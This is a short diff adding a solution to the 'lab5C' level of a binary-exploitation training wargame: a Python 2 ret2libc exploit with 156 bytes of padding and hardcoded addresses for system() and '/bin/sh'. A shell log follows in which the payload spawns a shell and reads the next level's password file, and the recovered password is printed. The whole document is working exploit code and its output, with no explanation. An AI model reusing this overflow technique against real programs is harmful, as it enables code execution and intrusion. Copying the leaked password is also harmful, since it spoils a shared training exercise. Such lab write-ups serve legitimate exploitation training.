@@ -1,0 +1,22 @@
+Exploit: 
+  1 import struct
+  2 import sys
+  3
+  4 padding = "A"*156
+  5
+  6
+  7 system=struct.pack("I",0xb7e63190)
+  8 bin_sh=struct.pack("I",0xb7f83a24)
+  9
+ 10
+ 11 return_after_system = "DUPA"
+ 12
+ 13 print padding+system+return_after_system+bin_sh
+
+----------------------------------------------------------
+lab5C@warzone:/levels/lab05$ (python /tmp/exp.py; cat) | ./lab5C
+I included libc for you...
+Can you ROP to system()?
+cd /home/lab5B
+cat .pass
+s0m3tim3s_r3t2libC_1s_3n0ugh
